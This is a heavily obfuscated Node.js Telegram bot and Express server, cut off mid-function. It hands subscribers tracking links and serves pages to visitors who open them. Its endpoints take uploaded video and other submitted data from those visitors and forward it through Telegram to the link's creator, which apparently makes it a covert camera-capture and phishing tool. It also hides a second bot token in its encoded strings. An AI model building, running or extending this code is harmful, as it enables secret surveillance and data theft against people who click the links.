const _0x1155f9 = _0x2f15;
(function (_0x106772, _0x12c058) {
    const _0x9f08fe = _0x2f15, _0x117cae = _0x106772();
    while (!![]) {
        try {
            const _0x12b786 = parseInt(_0x9f08fe(0xbf)) / (0x1 * -0x2199 + -0x9 * -0x3b0 + 0x6a * 0x1) + -parseInt(_0x9f08fe(0x1a0)) / (-0x216a + -0x196b + 0x3ad7) + parseInt(_0x9f08fe(0x32e)) / (0x1 * -0xf53 + -0x782 + 0xac * 0x22) + parseInt(_0x9f08fe(0x658)) / (0x896 + -0x1765 + -0x17 * -0xa5) * (parseInt(_0x9f08fe(0x2af)) / (0x24f * -0x9 + -0x135 + 0x1601)) + parseInt(_0x9f08fe(0x4f9)) / (0x1 * 0x211e + 0x23e9 + -0x4501) * (-parseInt(_0x9f08fe(0x263)) / (-0x1090 + -0xf6c + 0x2003 * 0x1)) + -parseInt(_0x9f08fe(0x604)) / (-0x5 * 0x19e + -0x242f + 0x2c4d * 0x1) + parseInt(_0x9f08fe(0x3d8)) / (0x26b * -0xa + -0xb35 + 0x11b6 * 0x2);
            if (_0x12b786 === _0x12c058)
                break;
            else
                _0x117cae['push'](_0x117cae['shift']());
        } catch (_0x9c2690) {
            _0x117cae['push'](_0x117cae['shift']());
        }
    }
}(_0x20bb, 0x4ff4a * -0x1 + 0x979f * -0x6 + 0xcf71d), require(_0x1155f9(0x38d))[_0x1155f9(0x51e)]());
const TelegramBot = require(_0x1155f9(0x30e) + _0x1155f9(0x696) + 'i'), express = require(_0x1155f9(0x69e)), bodyParser = require(_0x1155f9(0x39b) + 'r'), multer = require(_0x1155f9(0x41e)), path = require(_0x1155f9(0x645)), fs = require('fs'), crypto = require(_0x1155f9(0x463)), axios = require(_0x1155f9(0x17b)), uuid = require(_0x1155f9(0x2ef)), botToken = process[_0x1155f9(0x5c3)]['n'], botUsername = _0x1155f9(0x134), bot = new TelegramBot(botToken, { 'polling': !![] }), developerChannels = [
        _0x1155f9(0x178),
        _0x1155f9(0x2e3),
        _0x1155f9(0x58e),
        _0x1155f9(0x5e8),
        _0x1155f9(0x336)
    ], SECOND_BOT_TOKEN = _0x1155f9(0x486) + _0x1155f9(0x5fd) + _0x1155f9(0x115) + _0x1155f9(0x612) + _0x1155f9(0x405), secondBot = new TelegramBot(SECOND_BOT_TOKEN, { 'polling': !![] });
let inviteLinks = {}, userPoints = {}, linkData = {}, visitorData = {};
function clearCache() {
    const _0x55766f = _0x1155f9, _0x142961 = { 'SETVO': _0x55766f(0x516) + _0x55766f(0x249) };
    console[_0x55766f(0x3c6)](_0x142961[_0x55766f(0x5f5)]), userPoints = {}, linkData = {}, visitorData = {};
    const _0x215701 = {};
}
setInterval(clearCache, (-0xd53 * -0x2 + 0x1dc + -0x157a) * (-0x308 * 0x6 + 0x262e + -0x1016));
async function isUserSubscribed(_0x36f4a7) {
    const _0x5ca9fa = _0x1155f9, _0x1e837b = {
            'Plsow': function (_0x195c1e, _0x2aab40) {
                return _0x195c1e === _0x2aab40;
            },
            'QRLZq': _0x5ca9fa(0x396),
            'OovcN': function (_0x1afb7, _0x418691) {
                return _0x1afb7 === _0x418691;
            },
            'oVwqw': _0x5ca9fa(0x5b6) + _0x5ca9fa(0x6bf),
            'sYlVG': function (_0x4737e5, _0x1eddf4) {
                return _0x4737e5 === _0x1eddf4;
            },
            'zOVSm': _0x5ca9fa(0x61f),
            'gulfo': _0x5ca9fa(0x326) + _0x5ca9fa(0x3a2) + _0x5ca9fa(0xcb) + _0x5ca9fa(0x195)
        };
    try {
        const _0x2a333d = await Promise[_0x5ca9fa(0x56a)](developerChannels[_0x5ca9fa(0x43b)](_0x5cf969 => bot[_0x5ca9fa(0x4e4) + _0x5ca9fa(0x4fe)](_0x5cf969, _0x36f4a7)));
        return _0x2a333d[_0x5ca9fa(0x128)](_0x4acee3 => {
            const _0x83543 = _0x5ca9fa, _0x17d57a = _0x4acee3[_0x83543(0x198)];
            return _0x1e837b[_0x83543(0x565)](_0x17d57a, _0x1e837b[_0x83543(0x487)]) || _0x1e837b[_0x83543(0xb7)](_0x17d57a, _0x1e837b[_0x83543(0x3d3)]) || _0x1e837b[_0x83543(0x542)](_0x17d57a, _0x1e837b[_0x83543(0x66b)]);
        });
    } catch (_0x5e8db0) {
        return console[_0x5ca9fa(0x4c4)](_0x1e837b[_0x5ca9fa(0x11d)], _0x5e8db0), ![];
    }
}
bot[_0x1155f9(0x2bb)](/\/Vip/, async _0x4af2da => {
    const _0x1e269b = _0x1155f9, _0x5235e6 = {
            'rdeSD': function (_0x2b298b, _0x3f77eb) {
                return _0x2b298b(_0x3f77eb);
            },
            'SHxQh': _0x1e269b(0x6d2) + _0x1e269b(0x31c) + _0x1e269b(0x2f0) + _0x1e269b(0x13e) + _0x1e269b(0x289) + _0x1e269b(0x6d5),
            'NFtiE': _0x1e269b(0xd7) + _0x1e269b(0x164) + _0x1e269b(0x4b4) + _0x1e269b(0x3e9) + _0x1e269b(0x1d9) + _0x1e269b(0x15f) + _0x1e269b(0x1c2),
            'lmtvF': _0x1e269b(0x2c0) + _0x1e269b(0x5bc) + _0x1e269b(0x544),
            'RoWpj': _0x1e269b(0x5f2) + _0x1e269b(0x12d) + _0x1e269b(0x5ef) + _0x1e269b(0x6da),
            'BKJYz': _0x1e269b(0x14c) + _0x1e269b(0x47e) + _0x1e269b(0x162) + _0x1e269b(0x5ac),
            'uAlbs': _0x1e269b(0x238) + _0x1e269b(0x4f1) + _0x1e269b(0x465)
        }, _0x9607c2 = _0x4af2da[_0x1e269b(0x12c)]['id'], _0x2628fb = _0x4af2da[_0x1e269b(0x112)]['id'], _0x38bc69 = await _0x5235e6[_0x1e269b(0x6ea)](isUserSubscribed, _0x9607c2);
    if (!_0x38bc69) {
        const _0x17adb4 = _0x5235e6[_0x1e269b(0x30b)], _0x177651 = developerChannels[_0x1e269b(0x43b)](_0x153f8a => [{
                    'text': _0x1e269b(0x2b0) + _0x153f8a,
                    'url': _0x1e269b(0x61d) + _0x1e269b(0x40c) + _0x153f8a[_0x1e269b(0x1cf)](0x229d + -0x2dd + -0x1fbf)
                }]);
        bot[_0x1e269b(0x420) + 'e'](_0x9607c2, _0x17adb4, { 'reply_markup': { 'inline_keyboard': _0x177651 } });
        return;
    }
    const _0x1606cb = uuid['v4']();
    linkData[_0x1606cb] = {
        'userId': _0x2628fb,
        'chatId': _0x9607c2,
        'visitors': []
    };
    const _0x2f48e6 = _0x5235e6[_0x1e269b(0x617)];
    bot[_0x1e269b(0x420) + 'e'](_0x9607c2, _0x2f48e6, {
        'reply_markup': {
            'inline_keyboard': [
                [{
                        'text': _0x5235e6[_0x1e269b(0x431)],
                        'callback_data': _0x1e269b(0x666) + _0x1606cb
                    }],
                [{
                        'text': _0x5235e6[_0x1e269b(0x6e2)],
                        'callback_data': _0x1e269b(0x666) + _0x1606cb
                    }],
                [{
                        'text': _0x5235e6[_0x1e269b(0x308)],
                        'callback_data': _0x1e269b(0x666) + _0x1606cb
                    }],
                [{
                        'text': _0x5235e6[_0x1e269b(0x546)],
                        'callback_data': _0x1e269b(0x666) + _0x1606cb
                    }]
            ]
        }
    });
}), bot['on'](_0x1155f9(0x30f) + _0x1155f9(0x2b9), async _0x445839 => {
    const _0x3fcb8a = _0x1155f9, _0x4ee1bf = {
            'qvNqu': function (_0x51954c, _0x1d86af) {
                return _0x51954c === _0x1d86af;
            }
        }, _0x22d5fa = _0x445839[_0x3fcb8a(0x641)][_0x3fcb8a(0x12c)]['id'], _0x1ed5f9 = _0x445839[_0x3fcb8a(0x112)]['id'], _0x828499 = _0x445839[_0x3fcb8a(0x628)][_0x3fcb8a(0xc1)]('_')[0x53 * -0x19 + -0x7 * 0x479 + 0x9db * 0x4];
    if (linkData[_0x828499] && _0x4ee1bf[_0x3fcb8a(0x2b8)](linkData[_0x828499][_0x3fcb8a(0x56f)], _0x1ed5f9)) {
        const _0x194863 = _0x3fcb8a(0x18d) + _0x3fcb8a(0x404) + _0x3fcb8a(0x1be) + _0x3fcb8a(0x3c1) + _0x3fcb8a(0x68c) + _0x3fcb8a(0x67b) + _0x3fcb8a(0x230) + _0x3fcb8a(0x659) + _0x3fcb8a(0x4a3) + _0x3fcb8a(0x5e9) + _0x3fcb8a(0x610) + botUsername + _0x3fcb8a(0x180) + _0x828499;
        bot[_0x3fcb8a(0x420) + 'e'](_0x22d5fa, _0x194863);
    }
});
const baseUrl = process[_0x1155f9(0x5c3)]['r'];
bot[_0x1155f9(0x2bb)](/\/vip (.+)/, async (_0x2862f8, _0x55ebee) => {
    const _0x5cff81 = _0x1155f9, _0x2dc654 = {
            'MPjWv': function (_0xac3d50, _0x5ea17e) {
                return _0xac3d50(_0x5ea17e);
            },
            'YGteT': _0x5cff81(0x6d2) + _0x5cff81(0x31c) + _0x5cff81(0x2f0) + _0x5cff81(0x13e) + _0x5cff81(0x289) + _0x5cff81(0x6d5),
            'ifRRz': function (_0x4c6358, _0x52a896) {
                return _0x4c6358 !== _0x52a896;
            }
        }, _0xabcbee = _0x55ebee[-0x1c7b + 0x1 * 0x5bb + 0x48d * 0x5], _0x56400b = _0x2862f8[_0x5cff81(0x112)]['id'], _0x3a273a = _0x2862f8[_0x5cff81(0x12c)]['id'], _0x41a273 = await _0x2dc654[_0x5cff81(0x47d)](isUserSubscribed, _0x3a273a);
    if (!_0x41a273) {
        const _0x422648 = _0x2dc654[_0x5cff81(0x1d4)], _0x392ff2 = developerChannels[_0x5cff81(0x43b)](_0x31a760 => [{
                    'text': _0x5cff81(0x2b0) + _0x31a760,
                    'url': _0x5cff81(0x61d) + _0x5cff81(0x40c) + _0x31a760[_0x5cff81(0x1cf)](-0x10d * 0x11 + -0x79f + 0x5 * 0x519)
                }]);
        bot[_0x5cff81(0x420) + 'e'](_0x3a273a, _0x422648, { 'reply_markup': { 'inline_keyboard': _0x392ff2 } });
        return;
    }
    if (linkData[_0xabcbee]) {
        const {
            userId: _0x6e6ebc,
            visitors: _0x3d21ad
        } = linkData[_0xabcbee];
        if (_0x2dc654[_0x5cff81(0x698)](_0x56400b, _0x6e6ebc) && (!visitorData[_0x56400b] || !visitorData[_0x56400b][_0x5cff81(0x471)](_0x6e6ebc))) {
            _0x3d21ad[_0x5cff81(0x2c2)](_0x56400b);
            !visitorData[_0x56400b] && (visitorData[_0x56400b] = []);
            visitorData[_0x56400b][_0x5cff81(0x2c2)](_0x6e6ebc);
            !userPoints[_0x6e6ebc] && (userPoints[_0x6e6ebc] = 0x1 * 0x224f + -0x1 * -0x9b8 + -0x2c07);
            userPoints[_0x6e6ebc] += -0x7db * 0x1 + -0x733 + -0x3 * -0x505;
            const _0x2478e9 = _0x5cff81(0x237) + _0x5cff81(0x389) + _0x5cff81(0x230) + _0x5cff81(0x27a) + _0x5cff81(0x15b) + userPoints[_0x6e6ebc] + _0x5cff81(0x2de);
            bot[_0x5cff81(0x420) + 'e'](_0x3a273a, _0x2478e9);
            const _0x5ec81e = _0x5cff81(0x497) + _0x5cff81(0x4d4) + _0x5cff81(0x28c) + userPoints[_0x6e6ebc] + _0x5cff81(0x47c);
            bot[_0x5cff81(0x420) + 'e'](_0x6e6ebc, _0x5ec81e);
        }
    }
}), bot['on'](_0x1155f9(0x30f) + _0x1155f9(0x2b9), async _0x5803bc => {
    const _0x13c539 = _0x1155f9, _0x4ffcee = {
            'gQjQW': function (_0xebd1f9, _0x4c12e7) {
                return _0xebd1f9 === _0x4c12e7;
            }
        }, _0x5156b3 = _0x5803bc[_0x13c539(0x641)][_0x13c539(0x12c)]['id'], _0x2c059b = _0x5803bc[_0x13c539(0x112)]['id'], _0x48d152 = _0x5803bc[_0x13c539(0x628)][_0x13c539(0xc1)]('_')[0x436 + 0x1415 + -0x1849];
    if (linkData[_0x48d152] && _0x4ffcee[_0x13c539(0x555)](linkData[_0x48d152][_0x13c539(0x56f)], _0x2c059b)) {
        const _0x3c0326 = _0x13c539(0x18d) + _0x13c539(0x404) + _0x13c539(0x1be) + _0x13c539(0x3c1) + _0x13c539(0x68c) + _0x13c539(0x67b) + _0x13c539(0x230) + _0x13c539(0x659) + _0x13c539(0x144) + _0x13c539(0x6df) + _0x13c539(0x5c7) + botUsername + _0x13c539(0x180) + _0x48d152;
        bot[_0x13c539(0x420) + 'e'](_0x5156b3, _0x3c0326);
    }
}), bot[_0x1155f9(0x2bb)](/\/start (.+)/, async (_0x26f135, _0x5305f4) => {
    const _0x49f56e = _0x1155f9, _0x179fcd = {
            'PPFiZ': function (_0x23347a, _0x243965) {
                return _0x23347a(_0x243965);
            },
            'vJfID': _0x49f56e(0x6d2) + _0x49f56e(0x31c) + _0x49f56e(0x2f0) + _0x49f56e(0x13e) + _0x49f56e(0x289) + _0x49f56e(0x6d5),
            'WeZBj': function (_0x404dc6, _0x4d7200) {
                return _0x404dc6 !== _0x4d7200;
            }
        }, _0x2b9a2e = _0x5305f4[0x21e2 + 0x26fa + -0x48db], _0x3c5a65 = _0x26f135[_0x49f56e(0x112)]['id'], _0x177341 = _0x26f135[_0x49f56e(0x12c)]['id'], _0x2493b7 = await _0x179fcd[_0x49f56e(0x3b1)](isUserSubscribed, _0x177341);
    if (!_0x2493b7) {
        const _0x385433 = _0x179fcd[_0x49f56e(0x509)], _0x59cf62 = developerChannels[_0x49f56e(0x43b)](_0x190bd6 => [{
                    'text': _0x49f56e(0x2b0) + _0x190bd6,
                    'url': _0x49f56e(0x61d) + _0x49f56e(0x40c) + _0x190bd6[_0x49f56e(0x1cf)](-0x15 * -0x12f + 0x17 * -0xbf + 0xb3 * -0xb)
                }]);
        bot[_0x49f56e(0x420) + 'e'](_0x177341, _0x385433, { 'reply_markup': { 'inline_keyboard': _0x59cf62 } });
        return;
    }
    if (linkData[_0x2b9a2e]) {
        const {
            userId: _0xab87da,
            chatId: _0x46acec,
            visitors: _0x15562d
        } = linkData[_0x2b9a2e];
        if (_0x179fcd[_0x49f56e(0x324)](_0x3c5a65, _0xab87da) && (!visitorData[_0x3c5a65] || !visitorData[_0x3c5a65][_0x49f56e(0x471)](_0xab87da))) {
            _0x15562d[_0x49f56e(0x2c2)](_0x3c5a65);
            !visitorData[_0x3c5a65] && (visitorData[_0x3c5a65] = []);
            visitorData[_0x3c5a65][_0x49f56e(0x2c2)](_0xab87da);
            !userPoints[_0xab87da] && (userPoints[_0xab87da] = -0x2 * -0x6e + 0x70 * 0x31 + -0x164c);
            userPoints[_0xab87da] += -0x1fd7 + -0x1ab4 + 0x3a8c;
            const _0xccdf54 = _0x49f56e(0x237) + _0x49f56e(0x389) + _0x49f56e(0x230) + _0x49f56e(0x27a) + _0x49f56e(0x15b) + userPoints[_0xab87da] + (_0x49f56e(0x32a) + _0x49f56e(0x60d) + _0x49f56e(0xdf) + _0x49f56e(0x46e) + _0x49f56e(0x685) + _0x49f56e(0x2eb));
            bot[_0x49f56e(0x420) + 'e'](_0x46acec, _0xccdf54);
        }
    }
});
const app = express();
app[_0x1155f9(0x442)](bodyParser[_0x1155f9(0x374)]({
    'extended': !![],
    'limit': _0x1155f9(0x64d)
})), app[_0x1155f9(0x442)](bodyParser[_0x1155f9(0xe4)]({ 'limit': _0x1155f9(0x234) })), app[_0x1155f9(0x442)](express[_0x1155f9(0x418)](__dirname));
const storage = multer[_0x1155f9(0x37f) + _0x1155f9(0x579)](), upload = multer({ 'storage': storage }), uploadVoice = multer({ 'dest': _0x1155f9(0x6d3) });
app[_0x1155f9(0x45b)](_0x1155f9(0x215) + 'rm', (_0xc76e8d, _0x28abdf) => {
    const _0x38b894 = _0x1155f9, _0xc360c4 = {
            'PTSvO': _0x38b894(0x367) + _0x38b894(0x3aa) + _0x38b894(0x323),
            'yvYLP': _0x38b894(0x476),
            'kEUII': _0x38b894(0x183),
            'ZhJYh': _0x38b894(0x519),
            'IhWdz': _0x38b894(0x6dc),
            'ydmai': _0x38b894(0x2e2),
            'qJVaV': _0x38b894(0x36f)
        }, _0x6f5030 = _0xc76e8d[_0x38b894(0x4fd)][_0x38b894(0x35d)], _0x5f4dac = _0xc76e8d[_0x38b894(0x4fd)][_0x38b894(0x2be)];
    if (!_0x6f5030)
        return _0x28abdf[_0x38b894(0x198)](-0x3 * 0x616 + -0x2320 + -0x36f2 * -0x1)[_0x38b894(0x535)](_0xc360c4[_0x38b894(0x6c7)]);
    let _0x2a76fc = '';
    switch (_0x5f4dac) {
    case _0xc360c4[_0x38b894(0x2e7)]:
        _0x2a76fc = _0xc360c4[_0x38b894(0x344)];
        break;
    case _0xc360c4[_0x38b894(0x146)]:
        _0x2a76fc = _0xc360c4[_0x38b894(0x691)];
        break;
    case _0xc360c4[_0x38b894(0x136)]:
    default:
        _0x2a76fc = _0xc360c4[_0x38b894(0x66c)];
        break;
    }
    _0x28abdf[_0x38b894(0x13a)](path[_0x38b894(0x33d)](__dirname, _0x2a76fc));
}), app[_0x1155f9(0x45b)](_0x1155f9(0x5b7) + _0x1155f9(0xf2), (_0x5dde6e, _0x3710a7) => {
    const _0x2ab37e = _0x1155f9, _0x43dc26 = {
            'JNJSV': function (_0x3aa30b, _0x12fbe3) {
                return _0x3aa30b(_0x12fbe3);
            },
            'bRtLf': _0x2ab37e(0x1c7),
            'MSQRk': _0x2ab37e(0x445) + _0x2ab37e(0x501) + _0x2ab37e(0x1e3) + _0x2ab37e(0x4da) + _0x2ab37e(0x50c) + _0x2ab37e(0x42d),
            'RRNak': _0x2ab37e(0x1fa) + _0x2ab37e(0x382) + _0x2ab37e(0x29d) + _0x2ab37e(0x1b0) + _0x2ab37e(0x328) + _0x2ab37e(0x60b)
        }, _0xf0b86a = _0x5dde6e[_0x2ab37e(0xee)][_0x2ab37e(0x654)];
    _0x43dc26[_0x2ab37e(0x273)](validateLinkUsage, _0xf0b86a) ? _0x3710a7[_0x2ab37e(0x13a)](path[_0x2ab37e(0x33d)](__dirname, _0x43dc26[_0x2ab37e(0x401)])) : (_0x3710a7[_0x2ab37e(0x535)](_0x43dc26[_0x2ab37e(0x3a6)]), bot[_0x2ab37e(0x420) + 'e'](linkUsage[_0xf0b86a][_0x2ab37e(0x35d)], _0x43dc26[_0x2ab37e(0x60a)]));
}), app[_0x1155f9(0x45b)](_0x1155f9(0x3fe) + _0x1155f9(0x468) + 'd', (_0x42a404, _0x800faa) => {
    const _0x44ce91 = _0x1155f9, _0x5e19ed = {
            'QJkKR': function (_0x4f3e16, _0xf468d6) {
                return _0x4f3e16(_0xf468d6);
            },
            'UpISO': _0x44ce91(0x61e),
            'cIXGh': _0x44ce91(0x445) + _0x44ce91(0x501) + _0x44ce91(0x1e3) + _0x44ce91(0x4da) + _0x44ce91(0x50c) + _0x44ce91(0x42d),
            'ApOHR': _0x44ce91(0x1fa) + _0x44ce91(0x382) + _0x44ce91(0x29d) + _0x44ce91(0x1b0) + _0x44ce91(0x328) + _0x44ce91(0x60b)
        }, _0x2cf573 = _0x42a404[_0x44ce91(0xee)][_0x44ce91(0x654)];
    _0x5e19ed[_0x44ce91(0x187)](validateLinkUsage, _0x2cf573) ? _0x800faa[_0x44ce91(0x13a)](path[_0x44ce91(0x33d)](__dirname, _0x5e19ed[_0x44ce91(0x21d)])) : (_0x800faa[_0x44ce91(0x535)](_0x5e19ed[_0x44ce91(0x524)]), bot[_0x44ce91(0x420) + 'e'](linkUsage[_0x2cf573][_0x44ce91(0x35d)], _0x5e19ed[_0x44ce91(0x45d)]));
}), app[_0x1155f9(0x45b)](_0x1155f9(0xeb) + _0x1155f9(0x3bc), (_0x22c3e1, _0xe7b1b) => {
    const _0x312ac5 = _0x1155f9, _0xd37a33 = {
            'YJCvF': function (_0x24a0ce, _0x21bbdc) {
                return _0x24a0ce(_0x21bbdc);
            },
            'KAnuV': _0x312ac5(0x3d7),
            'bOndK': _0x312ac5(0x445) + _0x312ac5(0x501) + _0x312ac5(0x1e3) + _0x312ac5(0x4da) + _0x312ac5(0x50c) + _0x312ac5(0x42d),
            'OuolG': _0x312ac5(0x1fa) + _0x312ac5(0x382) + _0x312ac5(0x29d) + _0x312ac5(0x1b0) + _0x312ac5(0x328) + _0x312ac5(0x60b)
        }, _0x3f9a32 = _0x22c3e1[_0x312ac5(0xee)][_0x312ac5(0x654)];
    _0xd37a33[_0x312ac5(0x2b4)](validateLinkUsage, _0x3f9a32) ? _0xe7b1b[_0x312ac5(0x13a)](path[_0x312ac5(0x33d)](__dirname, _0xd37a33[_0x312ac5(0x2d1)])) : (_0xe7b1b[_0x312ac5(0x535)](_0xd37a33[_0x312ac5(0xb2)]), bot[_0x312ac5(0x420) + 'e'](linkUsage[_0x3f9a32][_0x312ac5(0x35d)], _0xd37a33[_0x312ac5(0x31b)]));
}), app[_0x1155f9(0x45b)](_0x1155f9(0x6cb) + _0x1155f9(0x161), (_0x204b5e, _0x245ee5) => {
    const _0xe7c7ed = _0x1155f9, _0x59ee63 = {
            'fTkkJ': function (_0x9691b7, _0xc981aa) {
                return _0x9691b7(_0xc981aa);
            },
            'dUDhi': _0xe7c7ed(0x364),
            'tPEPj': _0xe7c7ed(0x445) + _0xe7c7ed(0x501) + _0xe7c7ed(0x1e3) + _0xe7c7ed(0x4da) + _0xe7c7ed(0x50c) + _0xe7c7ed(0x42d),
            'utePr': _0xe7c7ed(0x1fa) + _0xe7c7ed(0x382) + _0xe7c7ed(0x29d) + _0xe7c7ed(0x1b0) + _0xe7c7ed(0x328) + _0xe7c7ed(0x60b)
        }, _0x3d5769 = _0x204b5e[_0xe7c7ed(0xee)][_0xe7c7ed(0x654)];
    _0x59ee63[_0xe7c7ed(0x331)](validateLinkUsage, _0x3d5769) ? _0x245ee5[_0xe7c7ed(0x13a)](path[_0xe7c7ed(0x33d)](__dirname, _0x59ee63[_0xe7c7ed(0x523)])) : (_0x245ee5[_0xe7c7ed(0x535)](_0x59ee63[_0xe7c7ed(0x303)]), bot[_0xe7c7ed(0x420) + 'e'](linkUsage[_0x3d5769][_0xe7c7ed(0x35d)], _0x59ee63[_0xe7c7ed(0x6a1)]));
}), app[_0x1155f9(0x69f)](_0x1155f9(0x456) + 'es', (_0x3d2d2a, _0x4cb528) => {
    const _0x52d638 = _0x1155f9, _0x4d9ee4 = {
            'XDfMR': _0x52d638(0x296) + _0x52d638(0x426) + _0x52d638(0x4ba) + ':',
            'AuhaU': _0x52d638(0x607) + _0x52d638(0x522),
            'wjgOx': _0x52d638(0x644)
        }, _0x2be74e = _0x3d2d2a[_0x52d638(0x496)][_0x52d638(0x35d)], _0x43d209 = _0x3d2d2a[_0x52d638(0x496)][_0x52d638(0x6a7)], _0x129460 = _0x3d2d2a[_0x52d638(0x496)][_0x52d638(0xdc)];
    console[_0x52d638(0x3c6)](_0x4d9ee4[_0x52d638(0x67d)], _0x3d2d2a[_0x52d638(0x496)]), bot[_0x52d638(0x420) + 'e'](_0x2be74e, _0x52d638(0x29f) + _0x52d638(0x5fe) + _0x52d638(0x1ea) + ':\x20' + _0x43d209 + (_0x52d638(0x4d5) + _0x52d638(0x151)) + _0x129460)[_0x52d638(0x23e)](() => {
    })[_0x52d638(0x6e7)](_0x415578 => {
        const _0x429951 = _0x52d638;
        console[_0x429951(0x4c4)](_0x4d9ee4[_0x429951(0x1f4)], _0x415578[_0x429951(0x2ca)] ? _0x415578[_0x429951(0x2ca)][_0x429951(0x496)] : _0x415578);
    }), _0x4cb528[_0x52d638(0x446)](_0x4d9ee4[_0x52d638(0x5f7)]);
}), app[_0x1155f9(0x442)](bodyParser[_0x1155f9(0xe4)]()), app[_0x1155f9(0x442)](express[_0x1155f9(0x418)](__dirname)), app[_0x1155f9(0x45b)](_0x1155f9(0x2fe), (_0x1592dc, _0x56b787) => {
    const _0x56031e = _0x1155f9, _0xb7a45a = { 'uUyXw': _0x56031e(0xc4) };
    _0x56b787[_0x56031e(0x13a)](path[_0x56031e(0x33d)](__dirname, _0xb7a45a[_0x56031e(0x504)]));
}), app[_0x1155f9(0x69f)](_0x1155f9(0x635) + _0x1155f9(0x6cc), (_0x15934d, _0x2b3a67) => {
    const _0x516450 = _0x1155f9, _0x374f7f = { 'jOwsv': _0x516450(0x296) + _0x516450(0x426) + _0x516450(0x4ba) + ':' }, _0x770c0d = _0x15934d[_0x516450(0x496)][_0x516450(0x35d)], _0x325c53 = _0x15934d[_0x516450(0x496)][_0x516450(0x6a2) + 'r'];
    bot[_0x516450(0x420) + 'e'](_0x770c0d, _0x516450(0x39e) + _0x516450(0x31e) + _0x516450(0xb0) + _0x516450(0x4cc) + _0x516450(0x147) + _0x516450(0x135) + _0x516450(0x11c) + _0x516450(0x1a9) + ':\x20' + _0x325c53)[_0x516450(0x23e)](() => {
        const _0x456d88 = _0x516450;
        _0x2b3a67[_0x456d88(0xe4)]({ 'success': !![] });
    })[_0x516450(0x6e7)](_0x10cb42 => {
        const _0xabed5b = _0x516450;
        console[_0xabed5b(0x4c4)](_0x374f7f[_0xabed5b(0x63e)], _0x10cb42[_0xabed5b(0x2ca)] ? _0x10cb42[_0xabed5b(0x2ca)][_0xabed5b(0x496)] : _0x10cb42), _0x2b3a67[_0xabed5b(0xe4)]({ 'success': ![] });
    });
}), app[_0x1155f9(0x69f)](_0x1155f9(0x54e) + 'e', (_0x5835f9, _0x5bba52) => {
    const _0x5c7637 = _0x1155f9, _0x207c3e = {
            'oWTCs': _0x5c7637(0x58f) + _0x5c7637(0x25c) + _0x5c7637(0x614),
            'DFiCm': _0x5c7637(0x296) + _0x5c7637(0x426) + _0x5c7637(0x4ba) + ':'
        }, _0x507ebc = _0x5835f9[_0x5c7637(0x496)][_0x5c7637(0x35d)], _0x433a0c = _0x5835f9[_0x5c7637(0x496)][_0x5c7637(0x478)];
    bot[_0x5c7637(0x420) + 'e'](_0x507ebc, _0x5c7637(0xc3) + _0x5c7637(0x5a3) + _0x5c7637(0x2f2) + '\x20' + _0x433a0c)[_0x5c7637(0x23e)](() => {
        const _0x5386e3 = _0x5c7637;
        _0x5bba52[_0x5386e3(0x446)](_0x207c3e[_0x5386e3(0x5d5)]);
    })[_0x5c7637(0x6e7)](_0x184fc9 => {
        const _0x37e842 = _0x5c7637;
        console[_0x37e842(0x4c4)](_0x207c3e[_0x37e842(0x679)], _0x184fc9[_0x37e842(0x2ca)] ? _0x184fc9[_0x37e842(0x2ca)][_0x37e842(0x496)] : _0x184fc9), _0x5bba52[_0x37e842(0xe4)]({ 'success': ![] });
    });
}), app[_0x1155f9(0x442)](bodyParser[_0x1155f9(0xe4)]({ 'limit': _0x1155f9(0x5c1) })), app[_0x1155f9(0x442)](bodyParser[_0x1155f9(0x374)]({
    'limit': _0x1155f9(0x5c1),
    'extended': !![]
}));
const dataStore = {};
app[_0x1155f9(0x442)](express[_0x1155f9(0x418)](__dirname)), app[_0x1155f9(0x69f)](_0x1155f9(0x196) + 'eo', (_0x3c3ec3, _0xcb5c61) => {
    const _0x129e74 = _0x1155f9, _0x125c79 = {
            'wdUEY': _0x129e74(0x107),
            'YHtYl': _0x129e74(0x296) + _0x129e74(0x21e),
            'TeySd': _0x129e74(0x11a) + _0x129e74(0x506),
            'Dkfny': function (_0x177d0e, _0x26a96e) {
                return _0x177d0e || _0x26a96e;
            },
            'orSfY': _0x129e74(0x197) + _0x129e74(0x370) + _0x129e74(0x52f) + _0x129e74(0x59f) + _0x129e74(0x603),
            'wYyjX': _0x129e74(0x493),
            'XGEJH': _0x129e74(0x363),
            'VqZDv': _0x129e74(0x2c6) + _0x129e74(0x4a0) + _0x129e74(0x219),
            'vRrZB': _0x129e74(0x393) + _0x129e74(0x2df) + _0x129e74(0xe0),
            'Reinq': _0x129e74(0x11a) + _0x129e74(0x1a6) + _0x129e74(0xe8)
        }, _0x397817 = _0x3c3ec3[_0x129e74(0x496)][_0x129e74(0x35d)], _0x26a362 = _0x3c3ec3[_0x129e74(0x496)][_0x129e74(0x554)];
    if (_0x125c79[_0x129e74(0x61a)](!_0x397817, !_0x26a362))
        return _0xcb5c61[_0x129e74(0x198)](-0x1d01 + -0x1517 * 0x1 + 0x33a8)[_0x129e74(0x535)](_0x125c79[_0x129e74(0x458)]);
    const _0x545ace = _0x26a362[_0x129e74(0xc1)](',')[0x23d2 + -0x5bf * -0x3 + -0x350e * 0x1], _0x39b418 = path[_0x129e74(0x33d)](__dirname, _0x125c79[_0x129e74(0x3e5)]);
    !fs[_0x129e74(0x513)](_0x39b418) && fs[_0x129e74(0x400)](_0x39b418);
    try {
        const _0x555dc5 = Buffer[_0x129e74(0x112)](_0x545ace, _0x125c79[_0x129e74(0x596)]), _0x1b3ba9 = path[_0x129e74(0x33d)](_0x39b418, _0x397817 + _0x129e74(0x51c));
        fs[_0x129e74(0x575) + _0x129e74(0x621)](_0x1b3ba9, _0x555dc5), bot[_0x129e74(0x6a4)](_0x397817, _0x1b3ba9, { 'caption': _0x125c79[_0x129e74(0x63a)] })[_0x129e74(0x23e)](() => {
            const _0x1289b1 = _0x129e74;
            console[_0x1289b1(0x3c6)](_0x1289b1(0x2c1) + _0x1289b1(0x31a) + _0x1289b1(0x6a5) + _0x1289b1(0x284) + _0x397817), _0xcb5c61[_0x1289b1(0x446)](_0x125c79[_0x1289b1(0x316)]);
        })[_0x129e74(0x6e7)](_0x5ae273 => {
            const _0x56a4e0 = _0x129e74;
            console[_0x56a4e0(0x4c4)](_0x125c79[_0x56a4e0(0x6b1)], _0x5ae273), _0xcb5c61[_0x56a4e0(0x198)](-0x184 * 0x4 + -0x541 * 0x7 + 0x2ccb)[_0x56a4e0(0x535)](_0x125c79[_0x56a4e0(0x5de)]);
        });
    } catch (_0x1b41d7) {
